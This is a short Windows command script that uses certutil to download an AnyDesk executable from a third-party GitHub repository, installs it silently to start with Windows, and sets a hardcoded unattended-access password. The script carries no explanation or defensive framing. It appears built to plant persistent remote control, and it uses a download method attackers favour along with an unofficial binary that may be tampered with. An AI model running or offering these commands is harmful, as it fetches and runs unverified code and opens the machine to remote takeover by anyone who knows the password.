certutil -urlcache -split -f "https://raw.githubusercontent.com/AustriaOA/anydesk/refs/heads/main/AnyDesk.exe" "C:\Temp\AnyDesk.exe"
cd /d C:\Temp\
start /wait anydesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --create-desktop-icon
cd /d "C:\Program Files (x86)\AnyDesk
echo PwdX@123 | anydesk.exe --set-password
